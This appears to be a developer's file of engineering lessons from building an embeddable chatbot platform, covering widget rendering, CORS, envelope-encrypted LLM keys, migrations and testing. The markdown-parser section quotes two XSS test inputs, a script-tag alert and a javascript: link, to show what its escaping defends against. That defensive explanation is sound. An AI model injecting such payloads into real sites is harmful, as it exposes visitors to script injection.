- Pair `-webkit-mask-composite: xor` with `mask-composite: exclude`. They mean the same thing but ship under different names; declaring both keeps the ring visible in Safari and in Chromium/Firefox alike. Prefixed `-webkit-mask` must come first because the shorthand is order-sensitive.

Concretely, the ProBot bubble uses:

```css
.probot-bubble::before {
  content: "";
  position: absolute;
  inset: -3px;
  border-radius: 50%;
  padding: 3px;
  background: conic-gradient(from 0deg, #7c5cff, #ff5cae, #ffb85c, #5cffb8, #5caeff, #7c5cff);
  -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
  -webkit-mask-composite: xor;
  mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
  mask-composite: exclude;
  animation: probot-spin 3s linear infinite;
  pointer-events: none;
  z-index: -1;
}
```

The `z-index: -1` tucks the ring behind the button's own background so the gradient shows through only in the padding band, never over the star SVG.

### Progressive-render pattern for third-party embed widgets

> When an embed script needs a network fetch before it can render, what's the right failure mode?

Two mount patterns:

1. **Fetch-then-render.** Wait for the config API, only then attach the widget to the DOM. Clean happy path, but any network hiccup, CORS mismatch, or 404 on the config endpoint yields *no visible widget at all* - and because embed scripts silently `return` on failure by design (they must never throw on host pages), the site owner has no signal that anything went wrong. This is exactly what the ProBot widget did originally and it's why the manual-testing HTML page was blank.

2. **Render-then-hydrate.** Attach the bubble and a minimal fallback dialog synchronously, then fire the config fetch. On success, mutate the dialog's `innerHTML` and update the theme colour. On failure, leave the fallback in place. The bubble is *always* visible; the worst-case UX is a bubble that opens a "we're warming up, visit ProBot" dialog instead of a broken silent embed.

Pattern (2) is strictly better for a third-party embed: the whole point of embedding is that the site owner has already committed pixels to your widget, so failing invisibly wastes that commitment. It also makes the widget more debuggable - the site owner sees the bubble, clicks it, and immediately knows whether the config layer is broken.

The trade-off: pattern (2) forces you to keep a *safe default* rendering path that doesn't depend on config. That means a fallback theme colour (`#7c5cff` in ProBot's case), a generic aria-label ("Open chat" instead of "Open chat with Jane"), and a minimal fallback dialog with no owner data. These defaults must be correct *without* the config fetch - so the mount function can never depend on config being present before it renders.

A subtler bit: when you upgrade from fallback → hydrated dialog, mutate `dialog.innerHTML` in place rather than removing and re-appending the node. The click handler was bound to the dialog element with event delegation (`dataset.action === "close"`), so swapping innerHTML preserves the listener and the newly-rendered close button still works without any rewiring. If instead you swapped in a new dialog element, you'd have to re-attach every listener.


### Cross-origin chat calls from an embeddable widget

> How does an embed widget call a chat API on the vendor's domain without a user-supplied API key, and what breaks if you don't think about it?

Two things have to line up for this to work: **credential resolution** and **CORS**.

**Credential resolution.** The ProBot architecture has two BYO-key paths (documented in BYO-KEY.md). Path 1 is browser-local: the visitor's own encrypted `IndexedDB` holds the key, and every chat request rides an `x-llm-api-key` header. Path 2 is managed: the bot owner encrypted their own key into the DB via a KEK-wrapped DEK, and the chat route unwraps it in-memory whenever a request arrives without a header. For an embed widget on a third-party site, path 1 is a non-starter — asking a random recruiter to paste an OpenAI key is unrealistic — so the widget always uses path 2 by omitting the header. If the owner hasn't enabled managed storage, the server returns a non-2xx and the widget has to degrade to a fallback message rather than crashing. The takeaway: an embeddable surface *forces* the managed-key path to exist, or the surface is broken by default. It's not an optional feature.

**CORS.** The widget runs on `example.com`, but its fetch targets `pro-bot.dev`. Without an `Access-Control-Allow-Origin` header on the response, the browser aborts the request *before* it hits application code — you'll see a red CORS error in devtools and never a 200 or a useful body. ProBot's chat and config routes ship a shared `PUBLIC_CORS_HEADERS` (`Access-Control-Allow-Origin: *`, methods `GET, POST, OPTIONS`, a small allow-list of headers, plus `Max-Age: 86400`) and a matching `OPTIONS` handler returning 204. The `*` wildcard is safe here because the routes are already public — no cookies, no auth, no CSRF surface — but if you ever add a credentialed endpoint, `*` becomes forbidden with `Access-Control-Allow-Credentials`, and you'll need to echo the caller's `Origin` back explicitly.

Both concerns show up together: even if your credential resolution is perfect, a missing OPTIONS handler means the browser never sends the POST. And even if CORS is perfect, a widget that sends no key and hits a server without managed storage will 4xx. Debugging one without checking the other wastes time.

### Preserving delegated event handlers across `innerHTML` swaps

> The dialog listener was added to the dialog element before the click target existed. Why does it still work after the widget rewrites the dialog's inner HTML?

Because the listener is on the *parent* container, not on the eventual target — it uses delegation. The dialog element itself never gets replaced; only its children do. When `dialog.innerHTML = ...` runs, the DOM parses new child nodes and swaps them in, but the dialog node's own identity, its position in the tree, and its attached listeners all persist. Any click on the new children still bubbles up to the dialog, where the delegated handler reads `event.target.dataset.action` and dispatches on the value. This is why the widget hydrates the fallback dialog first, wires up the delegation once, and then rewrites the inner HTML when the config arrives — the "close" and "ask" handlers keep working across the swap with zero rewiring.

The alternative — attaching a listener directly to each button — would require re-binding after every `innerHTML` mutation, which is exactly the kind of thing that quietly stops working when a UI ships. Delegation moves the listener up to a node that isn't going to churn.


### Hand-rolling a safe markdown parser when a full library is too heavy

> When does it make sense to write your own markdown parser instead of pulling in `marked`, `micromark`, or `markdown-it`?

The trigger is bundle-size context. A React app that already ships MB of runtime doesn't notice a 40 KB parser. A widget that has a 50 KB budget and is 19 KB before markdown notices it very much — `marked` alone pushed the ProBot widget from 19 KB to 63 KB, past its budget. In that world, hand-rolling ~110 lines is *simpler* than the alternative, because the alternative isn't "just add a dep" — it's "add a dep and now audit-and-fight-with the bundle splitter."

The other trigger is scope. Full markdown parsers implement CommonMark — nested emphasis, setext headings, reference-style links, escape sequences, HTML pass-through, tight-vs-loose lists, and dozens of edge cases most users never hit. LLM-emitted markdown for a chat surface is a small subset: bold, italic, inline code, code fences, links, headings, lists, blockquotes, hard breaks. Skip the rest and the parser is a few dozen substitutions.

**Safety is the load-bearing part.** A parser that emits HTML from untrusted input has to prove it can't inject scripts. The pattern that works:

1. Call `escapeHtml` on every user-controlled substring *before* running any regex. `<script>alert(1)</script>` becomes `&lt;script&gt;alert(1)&lt;/script&gt;` before the parser even sees it. From that point on, the parser is only inserting tags it produces itself — the input can never introduce a real angle bracket.
2. Whitelist URL schemes on link `href`. `[click](javascript:alert(1))` looks like a legitimate markdown link but produces a working XSS payload if you emit the URL verbatim. Match `^(https?:|mailto:)` and collapse anything else to `#`.
3. Protect inline code from other transforms. Otherwise `` `**not bold**` `` gets its inner `**` eaten by the emphasis pass and renders as `<code><strong>not bold</strong></code>`. The trick: extract every `` `...` `` region into placeholders (`\x00C0\x00`, `\x00C1\x00`, ...) before running emphasis/link regexes, then restore. `\x00` is a null byte — it can't appear in normal text and won't collide with any other regex.

**What you give up:** correctness at the margins. `5*3*7` will incorrectly render as `5<em>3</em>7`. Nested emphasis in weird positions won't do the "right" thing. Reference-style links (`[text][ref]`) won't resolve. For a chat surface where the input is either LLM output (clean-ish) or a visitor's own message (rendered as text, not markdown), those trade-offs are invisible. In a Wikipedia-style setting they'd be unacceptable.

The generalizable heuristic: **use a full parser when your input is human-authored prose that people will proofread; hand-roll when the input is machine-generated or ephemeral and no one will notice a mis-rendered edge case.** LLM chat replies fall firmly in the second bucket.

### Bundle-size regressions from tree-shaking-resistant dependencies

> Why did adding a single import for `marked` add 44 KB to the widget bundle, not 10 KB like the "gzipped size" badge suggested?

Because the "gzipped size" number is a lie for un-served code. The bundle you ship over the network is minified but *not* gzipped by the build — the CDN gzips it in flight. So the meaningful budget for widget.js is the minified byte count, which is what esbuild reports. `marked` is 42 KB minified (44 KB after wrapping in the widget IIFE), and gzip cuts that in half over the wire but not for `esbuild --minify`'s output-size guard.

Tree-shaking helps only when the library was authored with side-effect-free named exports. `marked` v14+ *is* ESM with named exports (`import { marked } from "marked"`), so most of the encoding table code should be droppable... except the parser dispatches to token handlers via a Lexer→Parser→Renderer chain where every renderer method is reachable from `marked.parse`, so esbuild sees "everything used" and keeps it all. This is a common shape: a library exposes one function that internally reaches every code path, and tree-shaking gives you no savings because the reachability graph is dense.

The heuristic that would have saved a build cycle: **grep the library source for the entrypoint, and if it dispatches to many methods through a registry (renderer, lexer, plugin manager), assume tree-shaking will yield zero savings and budget for the full unminified byte count.** For `marked` this would have flagged the 42 KB before install.

The fix is either (a) a library with much smaller total surface (like `snarkdown` — 1 KB but allows raw HTML pass-through, an XSS problem) or (b) hand-rolling the subset you need. The ProBot widget went with (b) because the subset was small and the XSS risk had to be controlled anyway.

### Self-hosted chatbot: npm package vs cloned runtime

> Why scrap the "clone a repo and deploy a runtime" model in favor of an npm package? What are the tradeoffs?

The original self-host story was a separate Next.js app (`probot-bot/`) that the developer cloned, configured with env vars (`PROBOT_BOT_TOKEN`, `PROBOT_API_URL`, `OPENAI_API_KEY`), and deployed to their own domain. The runtime authenticated to the platform over `/api/v1/bot/{config,knowledge,conversations,leads}` — the platform kept the persona and knowledge; the runtime kept the LLM key and orchestrated the LLM call.

That model has three friction points that motivate the npm-package rewrite:

1. **Two deploys instead of one.** Every persona tweak needed a redeploy of the cloned runtime, even though the change lived in the platform's dashboard. Devs end up copy-pasting env vars around; junior devs leak keys in front-end bundles.
2. **Divided ownership of the config surface.** Persona lived on pro-bot.dev, LLM key lived in the runtime env, embed styling lived in yet a third place. Nobody could reason about the whole thing at once.
3. **Platform stays in the chat critical path.** Every visitor message hit `/api/v1/bot/knowledge` before the runtime could reply. A platform outage broke self-hosted bots too — the exact opposite of "self-hosted" ownership.

The npm package (`probot-self-hosted`) collapses those:

- **One deploy.** `npm i probot-self-hosted`, render `<ProbotBot />`, ship your app. Persona / knowledge / theme are props in your codebase, version-controlled next to everything else.
- **One trust boundary.** The LLM key lives in the developer's own backend (behind a `sendMessage` proxy or the `createOpenAIHandler` server helper). The platform's role shrinks to accepting analytics writes on two endpoints.
- **Platform is never in the chat critical path.** If pro-bot.dev is down, the widget still answers; only the async fire-and-forget "report this conversation to the dashboard" calls fail.

**Cost of the trade.** The package can't ship a "no code required" story — you have to wire a `sendMessage` and a server-side route. That is the correct floor: browser-only self-host is inherently unsafe (LLM keys shouldn't live in bundles), so the API surface makes the safe path the default and the unsafe path unrepresentable, not just discouraged in docs.

**Concrete example.** For a Next.js App Router site:

```ts
// app/api/probot-chat/route.ts — server-only, holds the LLM key
import { createOpenAIHandler } from "probot-self-hosted/adapters/openai";
const send = createOpenAIHandler({
  apiKey: process.env.OPENAI_API_KEY!,
  model: "gpt-4o-mini",
});
export async function POST(req: Request) {
  const { system, messages } = await req.json();
  return Response.json({ reply: await send({ system, messages }) });
}
```

```tsx
// app/layout.tsx — client, no LLM key anywhere
"use client";
import { ProbotBot } from "probot-self-hosted";

<ProbotBot
  name="Ada"
  context="…your knowledge…"
  sendMessage={async ({ system, messages }) => {
    const res = await fetch("/api/probot-chat", {
      method: "POST",
      body: JSON.stringify({ system, messages }),
    });
    return (await res.json()).reply;
  }}
  dashboard={{ token: process.env.NEXT_PUBLIC_PROBOT_TOKEN! }}
/>;
```

The `dashboard.token` is intentionally public-safe: a leaked `pbt_…` can only write conversation/lead analytics for one bot and is revocable in one click from **Settings → Deployment**. The LLM API key never appears in a client bundle.

**IIFE / script-tag path.** For pages without a bundler, esbuild emits a self-contained `dist/probot-self-hosted.iife.js` that bundles React and exposes `window.ProbotSelfHosted.mount(el, config)`. Same `sendMessage` contract — the server-side proxy stays exactly the same regardless of whether the client is React or plain HTML.

### Deployment-mode as a birth attribute (not a runtime toggle)

> Why make `deployment_mode` non-switchable after bot creation?

Managed and self-hosted bots live in different worlds: managed bots have a persona editor, a knowledge base, an envelope-encrypted LLM key, and a public `/u/<username>/chat` URL. Self-hosted bots have none of those — the whole config lives in the developer's code, and the platform only stores tokens + analytics.

If we let owners flip the mode after creation:

- Flipping managed → self-hosted leaves an orphaned envelope-encrypted key row, orphaned knowledge chunks, and a `/u/<username>/chat` URL that suddenly 404s. The dashboard would need to keep showing all those tabs anyway (in case they flip back), so the UI never simplifies.
- Flipping self-hosted → managed asks the platform to conjure a persona / knowledge / provider config out of thin air, or to force the owner through Bot Factory a second time.

Both directions have a "what do we do with the old state" problem that adds complexity every consumer has to reason about. Making mode a birth attribute means:

- The dashboard tab strip is a pure function of the mode. Self-hosted → `['deploy','account','security']`. Managed → `['bot','kb','model','deploy','account','security']`. No conditional rendering inside a tab, no "is this tab meaningful for this mode" logic scattered across components.
- The upsert in `/api/bots` and the "load my existing bot" query in `/dashboard/bots/new` scope to `AND deployment_mode='managed'` — one clause each, no runtime coordination between the endpoints.
- The API surface is smaller: no `PATCH /deployment` route to authorize, no state-machine to test, no "what happens if a token exists on a bot that's currently managed" edge case.

**Cost of the trade.** A user who registered a self-hosted bot but wants managed has to delete + recreate. That's a rare operation (people generally know which path they want before creation), and the simplicity elsewhere pays for it many times over. The `RegisterSelfHostedForm` copy also makes it very clear that the choice is at creation — nobody accidentally locks themselves in.

**Related pattern.** This is the same reasoning as making auth provider (email/password vs OAuth) a birth attribute in NextAuth: switching later requires either data loss or a complex merge, and users almost never actually want to. Cheaper to enforce the invariant at creation than to build the flip.

### Scoping upserts by a discriminator column

> Why does the Bot Factory upsert now say `AND deployment_mode = 'managed'`?

Before this change, `/api/bots` POST did an upsert with `WHERE user_id = ?` — implicit "one bot per user". Once self-hosted bots share the same `bots` table with `deployment_mode` as the discriminator, that lookup becomes ambiguous: a user with both a managed bot and a self-hosted bot could have Bot Factory silently overwrite the wrong row's name / persona / theme.

The fix is one line: `AND deployment_mode = 'managed'`. Same shape at `/dashboard/bots/new/page.tsx` where the server component loads the existing bot to hydrate the wizard.

**General rule.** When a table starts hosting rows for two different flows via a discriminator column, every query that assumes "single row per parent FK" needs to add the discriminator to its `WHERE` — otherwise cross-flow interference is a matter of when, not if. Grep the codebase for `.findFirst({ where: eq(bots.userId, ...) })` (and equivalents) as a starter checklist; any that model a per-user singleton for a specific flow need the extra clause.

This is a variant of the "polymorphic table" antipattern: if you find yourself doing this in more than two or three places, split the tables. Two flows sharing a table is fine; five flows sharing a table is the pattern telling you it wants to be normalized.

### Two LLM key stores: browser-local vs. server-managed

> Why does a managed bot answer fine on `/u/<username>/chat` but the embed widget says "the owner needs to save an AI key"?

The same bot has two independent places its API key can live, and the two chat surfaces read from different ones — so one working never implies the other does.

**Browser-local store.** The owner's key is kept in *their* browser only, in an encrypted IndexedDB store (`src/lib/client/llm-key-store.ts`, AES-256-GCM via Web Crypto, migrated off plaintext localStorage). `ChatWindow` reads it with `getApiKey()` and attaches it as the `x-llm-api-key` **header** on every `POST /api/chat/[botId]`. The key never travels in a JSON body and is never round-tripped through a ProBot endpoint. This is why the internal chat page works for the owner: it's *their* browser supplying the credential. Anyone else's browser — or the owner on a different machine — has an empty store and would fail the same way the widget does.

**Server-managed store.** For the embeddable widget there is no owner browser in the loop: `widget.js` runs on a stranger's site (janedoe.com) and sends **no** key header. So the chat route falls to the managed path — `resolveProviderAndKey` looks up `encrypted_llm_keys` by `botId`, envelope-decrypts it (per-row DEK wrapped by a KEK), and uses that. Resolution priority is: **header key > managed key > fail** (`missing_llm_key`, 400). The widget renders that 400 as the friendly "owner needs to save an AI key" line.

The managed row is populated by a **separate, explicit action** — the Managed-key panel in Settings → AI Model & Key, which POSTs the plaintext straight into server-side envelope encryption (`POST /api/bots/[botId]/llm-key`). Saving the key locally (onboarding / Bot Factory step 4) does **not** create the managed row; the two are decoupled on purpose so a creator can test locally without ever exposing a managed key, and can revoke the managed key (deleting the row) without losing their local one.

**The design's own guard rail.** `POST /api/bots/[botId]/publish` refuses to activate a managed-mode bot with no `encrypted_llm_keys` row (`needs_managed_key`, 400), precisely because the embed would 400 on every visitor. Exemptions: `ollama` owners (the adapter uses a placeholder key) and `self_hosted` bots (their chat runs entirely in the consumer's own webapp and never hits this endpoint). So an *active* managed bot with no managed key is an anomaly — it means it reached `is_active = true` by a path that skipped the guard (provider was ollama at publish time, draft preview-token access, or predating the guard), not that the embed is broken.

**General rule.** When one credential can be provisioned through two decoupled channels (a per-device local store and a shared server store), "it works for me" is never evidence the shared path is provisioned. Trace which store each caller actually reads before concluding a bug exists; the fix is usually a missing provisioning step, not a code change.


### Multi-secret providers break single-secret assumptions (the Azure managed-path bug)

> Why did the embed widget fail for an Azure bot even though the encrypted key WAS stored server-side?

Most LLM providers authenticate with exactly one secret: the API key. The managed-key design (envelope-encrypt one string per bot) was built around that shape. Azure OpenAI is a *multi-value* credential: key + resource endpoint + API version (+ deployment name, which lives in `users.llmModel`). The original code "solved" this by refusing Azure on the managed path entirely — but the store endpoint (`POST /llm-key`) still *accepted* Azure keys, the publish guard only checked row-presence, and the dashboard banner did the same. Result: every surface an owner could see said "configured", and the only surface a *visitor* hit said `missing_llm_key`. A consistency bug across four call sites, not a single broken function.

**The fix pattern: split config from secret.** Only the API key is secret; the endpoint and API version are deployment *configuration* — they appear in every request URL and are useless without the key. So they land as plaintext columns (`azure_endpoint`, `azure_api_version`) on the same `encrypted_llm_keys` row, while the key alone stays envelope-encrypted. This keeps the crypto surface minimal (no re-encryption schema, no JSON-blob payload versioning) and lets the chat pipeline read config without a decrypt.

**General rule.** When a feature gate exists because "provider X needs more fields," the honest options are: (a) store the extra fields and lift the gate, or (b) enforce the gate at *every* surface — store-time, publish-time, warning banners, and serve-time — so the owner learns at save, not when a visitor's request fails. A gate enforced only at serve-time, with store-time acceptance, is a lie the UI tells the owner.

### Version your migration journal (Drizzle meta) or db:generate will snapshot-reset

> Why did `npm run db:generate` produce a full-schema `0000_` migration instead of a two-line ALTER?

Drizzle-kit decides "what changed" by diffing `schema.ts` against the last snapshot in `drizzle/meta/`. The journal (`_journal.json`) and snapshots were in `.gitignore`, so on any machine that didn't run the original generates, `drizzle/meta/` simply doesn't exist — and drizzle-kit treats the project as brand new: it emits a full-schema `CREATE TABLE IF NOT EXISTS` snapshot as migration `0000`. Applying it against an existing database is *silently useless*: `IF NOT EXISTS` no-ops on every existing table, so new COLUMNS inside those CREATE statements never land, while the migrations bookkeeping table happily records the file as applied.

**Recovery recipe** (works when the live DB already matches the pre-change schema): delete the rogue snapshot file + its row in `drizzle.__drizzle_migrations`; revert the schema change; `db:generate` a clean baseline and `db:migrate` it (no-op apply, marks the baseline); re-apply the schema change; `db:generate` again — now you get the real incremental `ALTER TABLE`; migrate. Old migration files become orphaned history (the fresh journal doesn't know them) — harmless, but they no longer participate in bootstrap.

**General rule.** `drizzle/meta/` is not build output — it is the *source of truth for diffing* and must be committed, same as the `.sql` files. Gitignoring it converts every fresh clone into a snapshot-reset landmine.

### Vitest: clearAllMocks leaks unconsumed mockResolvedValueOnce queues

> Why did a spec see `provider: "azure"` when its own mock said `anthropic`?

`vi.clearAllMocks()` clears call history but NOT the one-shot implementation queue. If spec A queues `findUserMock.mockResolvedValueOnce({llmProvider: "azure"})` and the code under test short-circuits *before* consuming it (e.g. zod validation fails first), that queued value survives into spec B — whose own `mockResolvedValueOnce` lands *behind* it in the queue. Use `vi.resetAllMocks()` in `beforeEach` and re-establish default implementations after it (in Vitest 2.x, `mockReset` also wipes the implementation passed to `vi.fn(impl)`, so factories like `insertMock` need explicit `mockImplementation` in the `beforeEach`).

### Removing a union member: let the compiler enumerate the blast radius

> What's the safest order of operations for ripping a provider out of a TypeScript codebase?

Delete the member from the *narrowest* type first — here, `"ollama"` from the `ProviderName` union — then run `tsc --noEmit` and treat the error list as the authoritative to-do list. Every `providerName === "ollama"` comparison becomes TS2367 ("no overlap"), every `Record<ProviderName, …>` with a leftover key becomes TS2322, every import of the deleted module becomes TS2307. This beats grep-driven removal because the compiler finds *semantic* dependents (exhaustive Records, switch arms, type-level usage) that a string search can miss, and it can't produce false positives in comments or docs. Grep still matters afterwards — but only for the things the compiler can't see: prose docs, JSON configs, test fixtures typed as `string`, and HTTP header names.

One trap: `Record<ProviderName, T>` initializers with the removed key *fail*, but a `ReadonlySet<ProviderName>` built from a literal array fails too (the array's inferred union no longer assigns) — while a plain `string[]` list of provider names sails through silently. Any provider list typed looser than `ProviderName` is invisible to this technique; keep such lists typed against the union precisely so removals surface at compile time.

### Envelope encryption for BYO LLM keys, and why a client-side gate can silently kill the whole managed path

> How does "recruiters can chat any time" work when the key lives in the owner's browser? And why did published bots show "No API key found" even though the key was stored?

**Envelope encryption (the managed-key at-rest model).** A raw LLM key is never stored directly. Instead a fresh random 32-byte **DEK** (data encryption key) encrypts the key with AES-256-GCM; that DEK is itself encrypted ("wrapped") with a long-lived **KEK** (key encryption key) held only in the `PROBOT_KEY_ENCRYPTION_KEY` env var, never in the database. The row stores six fields: ciphertext + iv + authTag (the encrypted key) and wrappedDek + dekIv + dekAuthTag (the encrypted DEK). To read the key you need both the DB row *and* the KEK — a DB dump alone is useless. Why two layers instead of encrypting the key straight with the KEK? Because it makes **key rotation** cheap: to rotate the KEK you only re-wrap each small DEK, never touching (or even decrypting) the bulk ciphertext. GCM's authTag is what makes tampering detectable — decryption fails loudly rather than returning garbage.

**The production failure mode.** If `PROBOT_KEY_ENCRYPTION_KEY` is unset, `encryptKey` throws a typed `KekUnavailableError` and the store endpoint returns `503 managed_storage_unavailable`. This is *intended* for self-host operators who never enable managed storage — but in a managed deployment it just means the env var wasn't set. The symptom was three different user-facing messages (browser-save-but-server-failed, publish-blocked, "no API key found" in a private window) that all reduced to the same cause: no encrypted row ever got written. Lesson: when several UI errors share one backend write, diagnose the write, not the messages — and the single decisive datum is the failing request's HTTP status/body (503 vs 500 vs 400 each point at a different root cause: KEK unset vs unapplied migration vs validation).

**Why the message was a symptom, not the bug.** The chat server (`resolveProviderAndKey`) already falls back to decrypting the managed key when no `x-llm-api-key` header arrives — that's the entire mechanism that lets a recruiter (who has nothing in their browser) chat. But the client `ChatWindow.send()` refused to even call the server unless the browser held a key, and always attached the header. So the managed-key branch was **dead code for the public** — every recruiter got bounced client-side with an owner-facing "set up your key" link. Fixing only the message would have kept the bot mute. The real fix is to let the request through with the header omitted and let the server use the managed key; only treat a server-returned key error as "no usable key." General principle: a client-side precondition that duplicates a server-side capability can silently disable that capability for the exact audience it was built for — when a symptom is "feature X never happens," check whether a caller is short-circuiting before X is ever reached.

### Before writing cleanup code, read the FK graph — ON DELETE CASCADE may already do it

> Deleting a self-hosted bot needs to clean up its tokens, conversations, leads, and keys. How much of that do I have to write?

None of it, if the foreign keys declare `ON DELETE CASCADE`. In this schema every child table (`bot_tokens`, `knowledge_base`, `conversations`, `leads`, `encrypted_llm_keys`, `bot_avatars`, and `messages` via `conversations`) references `bots.id` / `conversations.id` with `ON DELETE cascade`. So a single `db.delete(bots).where(eq(bots.id, id))` transitively removes the entire subtree in one statement — the database enforces it, atomically, regardless of which code path triggers the delete. Writing per-table cleanup in the handler would be redundant *and* risk drift (a new child table added later is covered by a cascade FK but not by hand-written cleanup). The lesson generalizes: when a delete "feels like it needs a lot of teardown," grep the migration `.sql` for the child tables' FK constraints first (`REFERENCES "public"."<parent>" ... ON DELETE`). If they cascade, the teardown is already written — in the schema, not the application. The corollary: this is exactly why the "no way to delete a self-hosted bot" bug was a UI-only fix — the destructive backend (endpoint + cascade) was complete and provider-agnostic; only the entry point was missing.

### A "redirect-away" guard can silently strand a whole feature surface

> Why did self-hosted bots have no delete button, no settings, nothing — when the API supported all of it?

The bot configuration page guarded self-hosted bots with `if (mode === "self_hosted") redirect("/dashboard")`, and the sidebar hid their configuration link. Each guard individually looks reasonable ("self-hosted bots don't have managed keys / knowledge tabs, so skip the config page"), but together they left the deployment mode with *zero* management surface — including capabilities that were fully built server-side (delete) and even promised in the UI ("manage from bot settings"). A redirect used as an access guard is heavier than it looks: it doesn't just hide the inapplicable parts, it removes the page as a home for *any* feature that mode might legitimately need. When a request is "add feature X for variant V," check first whether V was blanket-redirected or feature-flagged out of the surface where X naturally lives — the fix is often to replace the redirect with a variant-appropriate render, not to bolt X on somewhere new.
